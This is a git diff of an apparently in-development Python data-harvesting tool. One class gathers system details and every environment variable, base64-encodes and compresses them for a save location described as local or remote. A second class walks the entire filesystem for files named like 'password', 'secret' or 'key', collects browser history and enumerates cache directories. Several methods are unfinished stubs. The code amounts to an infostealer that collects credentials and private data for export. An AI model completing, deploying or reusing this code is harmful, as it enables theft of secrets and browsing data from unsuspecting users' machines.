@@ -21,8 +21,8 @@ import gzip
 
 
 class SysInfoScanner:
-    def __init__(self, ):
-        pass
+    def __init__(self, save_location):
+        self.save_location = save_location
 
     def os_info(self, ):
 
@@ -79,21 +79,6 @@ class SysInfoScanner:
             "Environment Variables": dict(os.environ)
         }
     
-    def _system_info(self,):
-        ''' the module to scan system info and export to somewhere
-        
-        '''
-        system_info = {}
-        system_info.update(self.os_info())
-        system_info.update(self.mach_proc_info())
-        system_info.update(self.user_info())
-        system_info.update(self.network_info())
-        system_info.update(self.disk_info())
-        system_info.update(self.mem_info())
-        system_info.update(self.env_info())
-
-        return system_info
-
     def _encode(self, info):
         ''' encode extracted system info with base64
         
@@ -108,19 +93,58 @@ class SysInfoScanner:
         '''
         os_type = platform.system()
         if os_type == "Windows":
+            # standard compression
             compression_level = zipfile.ZIP_DEFLATED
             with zipfile.ZipFile(save_location, 'w', compression=compression_level) as zipf:
                 zipf.writestr('info.zip', info)
 
         elif os_type == 'Linux':
             compression_level = 6  # Balanced compression
+            with gzip.open(save_location, 'wb', compresslevel=compression_level) as gzfile:
+                gzfile.write(info.encode("utf-8"))
+                
         else:  # macOS or other systems
             compression_level = 9  # Maximum compression
+            with gzip.open(save_location, 'wb', compresslevel=compression_level) as gzfile:
+                gzfile.write(info.encode("utf-8"))
+    
+    def _system_info(self,):
+        ''' the module to scan system info and export to somewhere
+        
+        '''
+        system_info = {}
+        system_info.update(self.os_info())
+        system_info.update(self.mach_proc_info())
+        system_info.update(self.user_info())
+        system_info.update(self.network_info())
+        system_info.update(self.disk_info())
+        system_info.update(self.mem_info())
+        system_info.update(self.env_info())
+
+        # encode
+        encoded_info = self._encode(system_info)
+        # compress
+        self._compress(encoded_info, self.save_location)
 
 
 class SenInfoScanner:
-    def __init__(self, ):
 
+    def __init__(self, save_location, root_path=None):
+        ''' 
+        :param save_location: local position or remote site
+        :param root_path: the root path to start scanning
+        '''
+        self.save_location = save_location
+        # dynamically set root path based on the operating system
+        if root_path:
+            self.root_path = root_path
+        else:
+            if platform.system() == 'Windows':
+                # Start scanning from the C:\ drive on Windows
+                self.root_path = 'C:\\'
+            else:
+                # Default to root path for Linux/macOS
+                self.root_path = '/'
 
     def _ext_scan(self, target_ext: list):
         ''' cover potential sensitive info via file extension
@@ -130,28 +154,85 @@ class SenInfoScanner:
         - intellectual property (IP) (.pptx, .py, .js)
         - configuration files (.conf, .ini, .xml)
         '''
+        sen_files = []
+        for ext in target_ext:
+            for root, dirs, files in os.walk(self.root_path):
+                for file in files:
+                    if file.endswith(ext):
+                        file_path = os.path.join(root, file)
+                        sen_files.append(file_path)
+        
+        return sen_files
 
 
     def _filename_scan(self,):
         ''' cover the filenames that can contain credentials info
         
         '''
+        sen_filenames = []
+        patterns = ['password', 'credentials','secret', 'key','login']
+        for root, dirs, files in os.walk(self.root_path):
+            for file in files:
+                if any(pattern in file.lower() for pattern in patterns):
+                    file_path = os.path.join(root, file)
+                    sen_filenames.append(file_path)
+        
+        return sen_filenames
+
     
     def _brw_hist(self,):
-        ''' 
+        ''' get broswer history data
         
         '''
+        hist_data = bh.get_browserhistory()
+        return hist_data
     
     def _cache(self,):
+        ''' scan for sen info in cache files
+        
+        '''
+        cache_paths = []
+        if platform.system() == "Windows":
+            # common cache directories on Windows
+            cache_dirs = [
+                # user cache
+                os.path.expanduser("~\\AppData\\Local\\Temp"),
+                # system temp directory
+                "C:\\Windows\\Temp",
+                os.path.expanduser("~\\AppData\\Local")
+            ]
+        else:
+            # common cache directories on Linux/macOS
+            cache_dirs = [
+                "/var/cache",
+                "/tmp",
+                os.path.expanduser('~/.cache')
+            ]
     
+        # scan the cache directories
+        for cache_dir in cache_dirs:
+            if os.path.exists(cache_dir):
+                for root, dires, files in os.walk(cache_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        cache_paths.append(file_path)
+        
+        return cache_paths
+
+
     def _db(self,):
         ''' cover potential db info like skype contact info
         
         '''
+        db_files = []
+
+        
 
     def _path(self,):
 
     
+    def _copy_files(self,):
+
 
     
     def _encode(self,):
@@ -160,9 +241,11 @@ class SenInfoScanner:
         '''
 
     def _compress(self,):
-        ''' compress extracted system info
+        ''' compress extracted system info with Maximum compression
         
         '''
+
+
 
     def _sen_info(self, save_location):
         ''' the module to collect sensitive info from specific locations/files/extensions
